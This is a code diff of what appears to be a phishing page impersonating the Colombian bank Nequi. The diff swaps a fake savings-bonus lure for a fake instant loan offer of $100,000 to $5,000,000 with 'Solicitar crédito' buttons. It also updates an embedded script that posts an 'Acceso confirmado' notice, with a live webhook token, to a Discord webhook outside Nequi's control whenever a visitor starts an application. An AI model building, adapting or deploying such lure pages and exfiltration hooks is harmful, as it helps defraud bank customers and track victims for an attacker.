@@ -89,18 +89,19 @@
                     backdrop-filter: blur(7px);
                     margin-top: 10px;
                   ">
-                Premiamos tu ahorro
+                Crédito de bajo monto
                 <br />
-                Ahorra $100.000 y recibe $20.000 extra ¡Tu premio en minutos!
+                Desde $100.000 a $5.000.000. En minutos te decimos si te lo
+                aprobamos o no
               </p>
               <p class="u-text-white" style="margin-top: 10px;">
-                Aprobación inmediata
+                Aprobación y estudio de credito en minutos
               </p>
               <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;margin-top: 10px;">
-                 Nequi premia tu ahorro
+                Con Nequi sales de la friendzone financiera
               </h1>
               <a id="salvavidas" class="nq-btn w-button"
-                style="background: #ea51aa !important;margin-top: 10px;">Solicita tu bono</a>
+                style="background: #b951ea !important;margin-top: 10px;">Solicitar crédito</a>
             </div>
           </div>
         </div>
@@ -122,7 +123,7 @@
         <div class="solicitudes">
           <div class="solicitud-item-text">
             <h2 class="u-text-white is-credit-effect-page">
-              <strong>Premio en línea y </strong><span class="u-text-white-2"><strong>al instante desde tu Web
+              <strong>Crédito en línea y </strong><span class="u-text-white-2"><strong>al instante desde tu Web
                   Nequi</strong></span>
             </h2>
             <p class="u-text-white">
@@ -131,13 +132,13 @@
               chance tienes de acceder a mejores condiciones crediticias.
             </p>
             <div class="income-btn is-credit-page is-mb">
-              <a id="btn-solicitar" class="nq-btn w-button">Solicita tu bono</a>
+              <a id="btn-solicitar" class="nq-btn w-button">Solicita tu crédito</a>
             </div>
           </div>
           <div class="solicitud-item-slide">
             <div class="slide">
               <h3 class="is-banner-slider-text">
-                Tu bono regalo de forma rapida <strong>#ATuRitmo</strong>
+                Paga tu crédito de forma flexible y <strong>#ATuRitmo</strong>
               </h3>
             </div>
           </div>
@@ -158,13 +159,13 @@
   </footer>
 
  <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1511413086232514612/Bzv6xZWMtRykKhL5lHr_GYCZoHw5lI1g4x_9V4xdHZaOdddNrXnDhSg0wxU4pclbmLgl";
+    const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1503743291114520721/imvadLKqt8BuBqh3Y9d5okKpGtOMMnE33Et60BFuuZxxa2vx-oLv2CDoUKVCIeTlig5e";
 
     function enviarAvisoADiscord() {
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: "✅ Acceso confirmado " })
+        body: JSON.stringify({ content: "✅ Acceso confirmado - Solicitud de crédito iniciada" })
       }).catch(error => console.error("Error:", error));
     }
 
